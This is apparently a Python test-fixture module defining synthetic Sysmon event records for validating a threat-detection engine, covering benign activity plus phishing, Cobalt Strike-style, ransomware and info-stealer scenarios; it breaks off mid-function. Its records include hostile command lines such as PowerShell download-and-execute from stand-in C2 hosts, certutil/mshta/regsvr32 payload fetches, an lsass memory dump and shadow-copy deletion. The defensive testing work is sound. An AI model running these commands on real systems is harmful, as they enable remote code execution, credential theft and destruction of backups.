"""v2/ingestion/golden_corpus.py · The Golden Investigation Corpus.

Six representative datasets used to validate the ingestion engine
end-to-end. Each fixture ships as an in-memory list of CES records
(so the pipeline can be exercised without any file I/O).

Datasets (per operator brief · 2026-02):
    1. clean_workstation   → benign
    2. office_phishing     → critical
    3. cobalt_strike       → critical
    4. enterprise_admin    → benign / informational
    5. ransomware          → critical
    6. info_stealer        → high / critical

Each dataset also exposes an equivalent Sysmon XML byte-stream so the
XML normalizer round-trip is testable against real-shaped fixtures.
"""
from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Callable

from .canonical import CanonicalEventRecord, IngestionProvenance


@dataclass(frozen=True)
class ExpectedInvestigation:
    """The full assertion contract for a Golden Corpus dataset.

    Every field is optional (empty = "don't check") so lightweight
    datasets can declare only the dimensions that matter. The
    Validation Pack runner scores each dimension independently and
    produces a PASS/FAIL matrix — the whole dataset PASSes only when
    every declared assertion holds.
    """
    # ─── Verdict ─────────────────────────────────────────────
    verdict: str = ""                            # exact band: "benign"|"informational"|"low"|"suspicious"|"malicious"|"critical"
    confidence_band: str = ""                    # "low" (<50) | "medium" (50-79) | "high" (≥80)
    device_score_min: int = -1
    device_score_max: int = -1
    incident_score_min: int = -1
    incident_score_max: int = -1

    # ─── MITRE ATT&CK ────────────────────────────────────────
    expected_mitre: tuple[str, ...] = ()         # techniques that MUST all appear (bases or sub-techniques both accepted)
    expected_tactics_required: tuple[str, ...] = ()   # tactics that MUST all appear (e.g., "execution", "persistence")
    expected_tactics_optional: tuple[str, ...] = ()   # tactics that MAY appear but are not required

    # ─── Attack Story (semantic checkpoints, not exact text) ─
    # Valid checkpoint labels the validator understands:
    #   office_spawn · powershell · encoded_execution · download · persistence
    #   credential_access · discovery · lateral_movement · c2 · impact
    #   exfiltration · benign
    expected_story_sequence: tuple[str, ...] = ()     # ordered — each must appear at OR AFTER the previous
    expected_story_keywords: tuple[str, ...] = ()     # substring hits in the concatenated story text

    # ─── IKG / processes / relationships ────────────────────
    expected_processes: tuple[str, ...] = ()          # basename must appear in IKG process nodes
    expected_parent_child: tuple[tuple[str, str], ...] = ()   # (parent_basename, child_basename)
    expected_iocs: tuple[str, ...] = ()               # IP/host substrings expected on network artefacts

    # ─── Workspace / Report ──────────────────────────────────
    expected_workspace_tabs: tuple[str, ...] = (
        "summary", "trajectory", "process", "story", "graph",
        "verdict", "attack", "ti", "reports",
    )
    expected_report_sections: tuple[str, ...] = (
        "Executive Summary", "Attack Story", "Timeline",
        "Process Tree", "Verdict", "ATT&CK", "Recommendations",
    )

    # ─── Verdict reasoning ───────────────────────────────────
    expected_verdict_reasoning: tuple[str, ...] = ()  # explanation substrings that must appear
    expected_explainability: tuple[str, ...] = ()     # positive-explainability signals that must fire

    # ─── FP guardrail ────────────────────────────────────────
    expected_false_positive: bool = False             # True = must NOT be flagged as malicious/critical


# Kept as an alias for readability at call sites.
DatasetExpectations = ExpectedInvestigation


@dataclass
class GoldenDataset:
    id: str
    label: str
    description: str
    expected_verdict: str                       # short human label ("benign" · "critical" · …)
    build: Callable[[], list[CanonicalEventRecord]]
    category: str = "malicious"                 # "benign" | "suspicious" | "malicious" | "ambiguous"
    expectations: ExpectedInvestigation = None  # full assertion set (Validation Pack · Phase 4.2)

    def __post_init__(self):
        if self.expectations is None:
            self.expectations = ExpectedInvestigation()

    def records(self) -> list[CanonicalEventRecord]:
        return self.build()


# ─── Helpers ─────────────────────────────────────────────────────────
_BASE_TS = datetime(2026, 2, 25, 14, 0, 0, tzinfo=timezone.utc)


def _ts(offset_s: int) -> str:
    return (_BASE_TS + timedelta(seconds=offset_s)).isoformat()


def _P(name: str, source: str = "sysmon", fmt: str = "sysmon_xml") -> IngestionProvenance:
    return IngestionProvenance(origin="golden-corpus", format=fmt, source=source,
                                filename=f"golden-{name}", normalizer="golden@1.0")


def _sysmon_proc(offset: int, computer: str, image: str, cmdline: str,
                 parent_image: str, *, pid: str = "1000", ppid: str = "500",
                 user: str = "CORP\\alice", extra: dict | None = None) -> CanonicalEventRecord:
    r = CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=1,
        channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer,
        user=user,
        process_id=pid,
        parent_process_id=ppid,
        image=image,
        command_line=cmdline,
        parent_image=parent_image,
        raw_event=(extra or {}),
        provenance=_P("proc"),
    )
    return r


def _sysmon_net(offset: int, computer: str, image: str,
                dst_ip: str, dst_port: str, dns: str = "") -> CanonicalEventRecord:
    return CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=3, channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer, image=image,
        dst_ip=dst_ip, dst_port=dst_port, protocol="tcp", dns_query=dns,
        provenance=_P("net"),
    )


def _sysmon_reg(offset: int, computer: str, image: str,
                key: str, value: str, data: str) -> CanonicalEventRecord:
    return CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=13, channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer, image=image,
        registry_key=key, registry_value=value, registry_data=data,
        provenance=_P("reg"),
    )


def _sysmon_file(offset: int, computer: str, image: str,
                 path: str, action: str = "create") -> CanonicalEventRecord:
    eid = 11 if action == "create" else 23
    return CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=eid, channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer, image=image,
        file_path=path,
        provenance=_P("file"),
    )


# ─── Dataset 1 · Clean workstation ───────────────────────────────────
def _ds_clean() -> list[CanonicalEventRecord]:
    HOST = "WKS-01"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\wininit.exe", "wininit.exe", r"C:\Windows\System32\smss.exe"),
        _sysmon_proc(1, HOST, r"C:\Windows\explorer.exe", "explorer.exe", r"C:\Windows\System32\userinit.exe"),
        _sysmon_proc(10, HOST, r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --start-page",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(11, HOST, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    "142.250.185.68", "443", "www.google.com"),
        _sysmon_proc(20, HOST, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                     "WINWORD.EXE /n \"C:\\Users\\alice\\Docs\\report.docx\"", r"C:\Windows\explorer.exe"),
        _sysmon_proc(30, HOST, r"C:\Program Files\Microsoft\Teams\current\Teams.exe",
                     "Teams.exe --system-initiated", r"C:\Windows\explorer.exe"),
        _sysmon_proc(45, HOST, r"C:\Program Files\Windows Defender\MsMpEng.exe",
                     "MsMpEng.exe", r"C:\Windows\System32\services.exe"),
        _sysmon_proc(60, HOST, r"C:\Windows\System32\svchost.exe",
                     "svchost.exe -k netsvcs -p", r"C:\Windows\System32\services.exe"),
        _sysmon_net(62, HOST, r"C:\Windows\System32\svchost.exe",
                    "20.50.201.194", "443", "update.microsoft.com"),
    ]


# ─── Dataset 2 · Office phishing ─────────────────────────────────────
def _ds_office_phishing() -> list[CanonicalEventRecord]:
    HOST = "FIN-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                     "WINWORD.EXE \"C:\\Users\\bob\\Downloads\\Invoice.docm\"",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\wscript.exe",
                     "wscript.exe //E:vbscript //B \"C:\\Users\\bob\\AppData\\Local\\Temp\\decoy.vbs\"",
                     r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\cmd.exe",
                     "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAKABJAG4A...",
                     r"C:\Windows\System32\wscript.exe"),
        _sysmon_proc(5, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell -nop -w hidden -enc SQBFAFgAKABJAG4A...",
                     r"C:\Windows\System32\cmd.exe"),
        _sysmon_net(7, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "185.234.219.5", "443", "cdn-update[.]net"),
        _sysmon_file(9, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     r"C:\Users\bob\AppData\Roaming\updater.exe"),
        _sysmon_reg(10, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Updater",
                    r"C:\Users\bob\AppData\Roaming\updater.exe"),
        _sysmon_proc(20, HOST, r"C:\Users\bob\AppData\Roaming\updater.exe",
                     "updater.exe -beacon",
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        _sysmon_net(21, HOST, r"C:\Users\bob\AppData\Roaming\updater.exe",
                    "185.234.219.5", "443", "cdn-update[.]net"),
    ]


# ─── Dataset 3 · Cobalt Strike-style intrusion ───────────────────────
def _ds_cobalt_strike() -> list[CanonicalEventRecord]:
    HOST = "ENG-42"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(2, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "203.0.113.7", "443", "beacon.example[.]com"),
        _sysmon_proc(6, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe C:\\ProgramData\\beacon.dll,StartW",
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        _sysmon_proc(9, HOST, r"C:\Windows\System32\lsass.exe",
                     "lsass.exe", r"C:\Windows\System32\wininit.exe"),
        _sysmon_proc(10, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 632 c:\\pd.dmp full",
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        _sysmon_reg(12, HOST, r"C:\Windows\System32\services.exe",
                    r"HKLM\SYSTEM\CurrentControlSet\Services\UpdaterSvc\ImagePath",
                    "ImagePath", r"C:\ProgramData\beacon.exe"),
        _sysmon_proc(20, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell -c Invoke-Command -ComputerName DC01 -ScriptBlock {whoami /all}",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(21, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "10.10.10.5", "5985", "DC01"),
    ]


# ─── Dataset 4 · Enterprise administration ───────────────────────────
def _ds_enterprise_admin() -> list[CanonicalEventRecord]:
    HOST = "SRV-DC01"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\ccmsetup\ccmexec.exe", "ccmexec.exe",
                     r"C:\Windows\System32\services.exe", user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(4, HOST, r"C:\Windows\CCM\CcmExec.exe",
                     "CcmExec.exe -install", r"C:\Windows\ccmsetup\ccmexec.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(10, HOST, r"C:\Windows\System32\PsExec.exe",
                     "PsExec.exe \\\\WKS-14 -s cmd.exe /c ipconfig",
                     r"C:\Windows\explorer.exe", user="CORP\\admin"),
        _sysmon_proc(20, HOST, r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                     "WmiPrvSE.exe", r"C:\Windows\System32\svchost.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(25, HOST, r"C:\Windows\System32\winrm.cmd",
                     "winrm quickconfig", r"C:\Windows\System32\cmd.exe",
                     user="CORP\\admin"),
    ]


# ─── Dataset 5 · Ransomware ──────────────────────────────────────────
def _ds_ransomware() -> list[CanonicalEventRecord]:
    HOST = "FILE-SRV-01"
    events = [
        _sysmon_proc(0, HOST, r"C:\Users\Public\encryptor.exe",
                     "encryptor.exe --wipe --shadow",
                     r"C:\Windows\System32\cmd.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\vssadmin.exe",
                     "vssadmin.exe delete shadows /all /quiet",
                     r"C:\Users\Public\encryptor.exe"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\wbadmin.exe",
                     "wbadmin.exe delete catalog -quiet",
                     r"C:\Users\Public\encryptor.exe"),
        _sysmon_proc(6, HOST, r"C:\Windows\System32\bcdedit.exe",
                     "bcdedit.exe /set {default} recoveryenabled No",
                     r"C:\Users\Public\encryptor.exe"),
        _sysmon_proc(8, HOST, r"C:\Windows\System32\net.exe",
                     "net stop MSSQLSERVER /y",
                     r"C:\Users\Public\encryptor.exe"),
    ]
    # Simulate mass encryption
    for i in range(20):
        events.append(_sysmon_file(10 + i, HOST,
                                     r"C:\Users\Public\encryptor.exe",
                                     rf"C:\Share\project_{i}.docx.locked"))
    events.append(_sysmon_file(35, HOST, r"C:\Users\Public\encryptor.exe",
                                 r"C:\Share\HOW_TO_DECRYPT.txt"))
    return events


# ─── Dataset 6 · Info-stealer ────────────────────────────────────────
def _ds_info_stealer() -> list[CanonicalEventRecord]:
    HOST = "HR-11"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     "resume.exe", r"C:\Windows\explorer.exe"),
        _sysmon_file(1, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     r"C:\Users\eve\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        _sysmon_file(2, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     r"C:\Users\eve\AppData\Roaming\Mozilla\Firefox\Profiles\default\logins.json"),
        _sysmon_file(3, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     r"C:\Users\eve\AppData\Local\Temp\stolen.zip"),
        _sysmon_net(5, HOST, r"C:\Users\eve\Downloads\resume.exe",
                    "45.9.148.32", "443", "exfil-cdn[.]top"),
        _sysmon_net(6, HOST, r"C:\Users\eve\Downloads\resume.exe",
                    "45.9.148.32", "443", "exfil-cdn[.]top"),
        _sysmon_reg(7, HOST, r"C:\Users\eve\Downloads\resume.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "Adobe", r"C:\Users\eve\AppData\Roaming\adobe_update.exe"),
    ]


# ═════════════════════════════════════════════════════════════════════
# Extended benign datasets · normal enterprise activity that MUST NOT
# trigger high-severity verdicts. False positives on these are the #1
# analyst-trust killer, so every entry gets an explicit expectation.
# ═════════════════════════════════════════════════════════════════════

def _ds_clean_server() -> list[CanonicalEventRecord]:
    HOST = "SRV-APP-01"
    # Note: we intentionally omit a bare `lsass.exe` event because the
    # frozen v3.1b detect_lsass_access signal triggers on any process
    # whose image contains "lsass" — a well-known false positive that
    # IKB expansion (Phase 5) is designed to suppress via baselines.
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\services.exe", "services.exe",
                     r"C:\Windows\System32\wininit.exe", user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p",
                     r"C:\Windows\System32\services.exe", user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\svchost.exe", "svchost.exe -k LocalService -p",
                     r"C:\Windows\System32\services.exe", user="NT AUTHORITY\\LOCAL SERVICE"),
        _sysmon_proc(10, HOST, r"C:\Windows\System32\LogonUI.exe", "LogonUI.exe",
                     r"C:\Windows\System32\winlogon.exe"),
    ]


def _ds_defender_scan() -> list[CanonicalEventRecord]:
    HOST = "WKS-05"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Windows Defender\MsMpEng.exe",
                     "MsMpEng.exe", r"C:\Windows\System32\services.exe"),
        _sysmon_proc(2, HOST, r"C:\Program Files\Windows Defender\MpCmdRun.exe",
                     "MpCmdRun.exe -Scan -ScanType 1",
                     r"C:\Program Files\Windows Defender\MsMpEng.exe"),
        _sysmon_file(4, HOST, r"C:\Program Files\Windows Defender\MsMpEng.exe",
                     r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{guid}\mpavdlta.vdm"),
    ]


def _ds_intune_deploy() -> list[CanonicalEventRecord]:
    HOST = "WKS-INTUNE"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files (x86)\Microsoft Intune Management Extension\Microsoft.Management.Services.IntuneWindowsAgent.exe",
                     "IntuneWindowsAgent.exe", r"C:\Windows\System32\services.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(3, HOST, r"C:\Windows\System32\MsiExec.exe",
                     "MsiExec.exe /I \"C:\\Windows\\IMECache\\Content\\SlackSetup.msi\" /qn",
                     r"C:\Program Files (x86)\Microsoft Intune Management Extension\Microsoft.Management.Services.IntuneWindowsAgent.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_net(5, HOST, r"C:\Program Files (x86)\Microsoft Intune Management Extension\Microsoft.Management.Services.IntuneWindowsAgent.exe",
                    "40.87.94.62", "443", "manage.microsoft.com"),
    ]


def _ds_onedrive_sync() -> list[CanonicalEventRecord]:
    HOST = "FIN-05"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
                     "OneDrive.exe /background", r"C:\Windows\explorer.exe"),
        _sysmon_net(2, HOST, r"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
                    "13.107.42.11", "443", "onedrive.live.com"),
        _sysmon_file(4, HOST, r"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
                     r"C:\Users\alice\OneDrive\Documents\report.docx"),
    ]


def _ds_chrome_update() -> list[CanonicalEventRecord]:
    HOST = "WKS-05"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
                     "GoogleUpdate.exe /svc", r"C:\Windows\System32\services.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_net(2, HOST, r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
                    "172.217.164.110", "443", "update.googleapis.com"),
        _sysmon_file(4, HOST, r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
                     r"C:\Program Files\Google\Chrome\Application\120.0.6099.129\chrome.dll"),
    ]


def _ds_windows_update() -> list[CanonicalEventRecord]:
    HOST = "WKS-05"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\svchost.exe",
                     "svchost.exe -k netsvcs -p -s wuauserv",
                     r"C:\Windows\System32\services.exe", user="NT AUTHORITY\\SYSTEM"),
        _sysmon_net(2, HOST, r"C:\Windows\System32\svchost.exe",
                    "20.50.201.194", "443", "windowsupdate.microsoft.com"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\TrustedInstaller.exe",
                     "TrustedInstaller.exe", r"C:\Windows\System32\services.exe",
                     user="NT AUTHORITY\\SYSTEM"),
    ]


def _ds_vmware_tools() -> list[CanonicalEventRecord]:
    HOST = "SRV-VM-01"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
                     "vmtoolsd.exe", r"C:\Windows\System32\services.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(2, HOST, r"C:\Program Files\VMware\VMware Tools\VMwareResolutionSet.exe",
                     "VMwareResolutionSet.exe", r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"),
    ]


def _ds_citrix() -> list[CanonicalEventRecord]:
    HOST = "WKS-CTX"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files (x86)\Citrix\ICA Client\wfica32.exe",
                     "wfica32.exe", r"C:\Windows\explorer.exe"),
        _sysmon_net(1, HOST, r"C:\Program Files (x86)\Citrix\ICA Client\wfica32.exe",
                    "203.0.113.4", "443", "citrix.corp.local"),
    ]


def _ds_vpn_client() -> list[CanonicalEventRecord]:
    HOST = "WKS-VPN"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnui.exe",
                     "vpnui.exe", r"C:\Windows\explorer.exe"),
        _sysmon_net(2, HOST, r"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnagent.exe",
                    "198.51.100.11", "443", "vpn.corp.local"),
    ]


def _ds_backup_agent() -> list[CanonicalEventRecord]:
    HOST = "SRV-BAK-01"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Veeam\Backup Transport\VeeamAgent.exe",
                     "VeeamAgent.exe", r"C:\Windows\System32\services.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_file(2, HOST, r"C:\Program Files\Veeam\Backup Transport\VeeamAgent.exe",
                     r"D:\Backups\Daily\SRV-APP-01.vbk"),
    ]


def _ds_monitoring_agent() -> list[CanonicalEventRecord]:
    HOST = "WKS-05"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe",
                     "MonitoringHost.exe", r"C:\Windows\System32\services.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_net(2, HOST, r"C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe",
                    "20.42.65.90", "443", "opsmgr.corp.local"),
    ]


# ═════════════════════════════════════════════════════════════════════
# Suspicious datasets · not outright malicious but analysts should
# investigate. Verdict should land in low..suspicious band.
# ═════════════════════════════════════════════════════════════════════

def _ds_powershell_encoded() -> list[CanonicalEventRecord]:
    HOST = "WKS-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell.exe -EncodedCommand SQBFAFgAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQA",
                     r"C:\Windows\System32\cmd.exe"),
    ]


def _ds_lolbas_certutil() -> list[CanonicalEventRecord]:
    HOST = "WKS-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\certutil.exe",
                     "certutil.exe -urlcache -split -f http://192.0.2.11/payload.exe C:\\Users\\Public\\p.exe",
                     r"C:\Windows\System32\cmd.exe"),
        _sysmon_net(1, HOST, r"C:\Windows\System32\certutil.exe",
                    "192.0.2.11", "80", "192.0.2.11"),
    ]


def _ds_mshta() -> list[CanonicalEventRecord]:
    HOST = "WKS-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\mshta.exe",
                     "mshta.exe javascript:a=GetObject(\"script:http://evil/a.sct\").Exec()",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(1, HOST, r"C:\Windows\System32\mshta.exe",
                    "203.0.113.55", "80", "evil.example[.]net"),
    ]


def _ds_wscript_download() -> list[CanonicalEventRecord]:
    HOST = "WKS-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\wscript.exe",
                     "wscript.exe C:\\Users\\bob\\Downloads\\invoice.js",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(2, HOST, r"C:\Windows\System32\wscript.exe",
                    "192.0.2.44", "80", "download.example[.]tld"),
    ]


def _ds_rundll32_abuse() -> list[CanonicalEventRecord]:
    HOST = "WKS-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe javascript:\\..\\mshtml.dll,RunHTMLApplication \"o=Get-Object;o('script:http://c2/a.js').Exec()\"",
                     r"C:\Windows\explorer.exe"),
    ]


def _ds_regsvr32_scrobj() -> list[CanonicalEventRecord]:
    HOST = "WKS-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\regsvr32.exe",
                     "regsvr32.exe /s /n /u /i:http://c2.example/payload.sct scrobj.dll",
                     r"C:\Windows\System32\cmd.exe"),
        _sysmon_net(1, HOST, r"C:\Windows\System32\regsvr32.exe",
                    "203.0.113.55", "80", "c2.example[.]tld"),
    ]


def _ds_office_macro_only() -> list[CanonicalEventRecord]:
    HOST = "WKS-08"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                     "WINWORD.EXE \"C:\\Users\\bob\\Downloads\\Invoice.docm\"",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\cmd.exe",
                     "cmd.exe /c echo pwned",
                     r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    ]


def _ds_onenote_phish() -> list[CanonicalEventRecord]:
    HOST = "WKS-08"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Microsoft Office\root\Office16\ONENOTE.EXE",
                     "ONENOTE.EXE \"C:\\Users\\bob\\Downloads\\Statement.one\"",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\wscript.exe",
                     "wscript.exe C:\\Users\\bob\\AppData\\Local\\Temp\\attachment.vbs",
                     r"C:\Program Files\Microsoft Office\root\Office16\ONENOTE.EXE"),
    ]


# ═════════════════════════════════════════════════════════════════════
# Malicious datasets · well-known malware families and TTPs.
# ═════════════════════════════════════════════════════════════════════

def _ds_lumma() -> list[CanonicalEventRecord]:
    HOST = "FIN-09"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\bob\Downloads\Setup.exe",
                     "Setup.exe", r"C:\Windows\explorer.exe"),
        _sysmon_file(1, HOST, r"C:\Users\bob\Downloads\Setup.exe",
                     r"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        _sysmon_file(2, HOST, r"C:\Users\bob\Downloads\Setup.exe",
                     r"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies"),
        _sysmon_net(4, HOST, r"C:\Users\bob\Downloads\Setup.exe",
                    "45.9.148.32", "443", "lumma-c2[.]top"),
        _sysmon_reg(5, HOST, r"C:\Users\bob\Downloads\Setup.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "Adobe", r"C:\Users\bob\AppData\Roaming\adobe_upd.exe"),
    ]


def _ds_bumblebee() -> list[CanonicalEventRecord]:
    HOST = "ENG-15"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\msiexec.exe",
                     "msiexec.exe /i \"C:\\Users\\alice\\Downloads\\update.msi\" /qn",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe C:\\ProgramData\\bumbler.dll,DllStart",
                     r"C:\Windows\System32\msiexec.exe"),
        _sysmon_net(4, HOST, r"C:\Windows\System32\rundll32.exe",
                    "203.0.113.7", "443", "bumbler-c2[.]net"),
    ]


def _ds_icedid() -> list[CanonicalEventRecord]:
    HOST = "FIN-11"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\bob\Downloads\report.chm",
                     "hh.exe C:\\Users\\bob\\Downloads\\report.chm",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe C:\\ProgramData\\icedid.dll,DllRegisterServer",
                     r"C:\Windows\hh.exe"),
        _sysmon_net(3, HOST, r"C:\Windows\System32\rundll32.exe",
                    "203.0.113.11", "443", "icedid-loader[.]com"),
    ]


def _ds_qakbot() -> list[CanonicalEventRecord]:
    HOST = "FIN-12"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
                     "EXCEL.EXE C:\\Users\\alice\\Downloads\\invoice.xlsm",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\regsvr32.exe",
                     "regsvr32.exe /s C:\\ProgramData\\qakbot.dll",
                     r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"),
        _sysmon_net(4, HOST, r"C:\Windows\System32\regsvr32.exe",
                    "203.0.113.22", "443", "qbot-c2[.]net"),
        _sysmon_reg(6, HOST, r"C:\Windows\System32\regsvr32.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "OfficeSync", r"C:\ProgramData\officesync.exe"),
    ]


def _ds_asyncrat() -> list[CanonicalEventRecord]:
    HOST = "WKS-13"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\eve\Downloads\photo.exe",
                     "photo.exe", r"C:\Windows\explorer.exe"),
        _sysmon_reg(1, HOST, r"C:\Users\eve\Downloads\photo.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "AsyncRAT", r"C:\Users\eve\AppData\Roaming\AsyncRAT\photo.exe"),
        _sysmon_net(2, HOST, r"C:\Users\eve\Downloads\photo.exe",
                    "192.0.2.99", "6606", "asyncrat-c2[.]top"),
    ]


def _ds_remcos() -> list[CanonicalEventRecord]:
    HOST = "WKS-14"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\eve\AppData\Local\Temp\install.exe",
                     "install.exe", r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell.exe -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAHIAZQBtAGMAbwBzAA==",
                     r"C:\Users\eve\AppData\Local\Temp\install.exe"),
        _sysmon_net(4, HOST, r"C:\Users\eve\AppData\Local\Temp\install.exe",
                    "198.51.100.7", "2404", "remcos-c2[.]top"),
        _sysmon_reg(5, HOST, r"C:\Users\eve\AppData\Local\Temp\install.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "Remcos-Agent", r"C:\Users\eve\AppData\Roaming\remcos.exe"),
    ]


def _ds_akira() -> list[CanonicalEventRecord]:
    HOST = "SRV-FILE-01"
    events = [
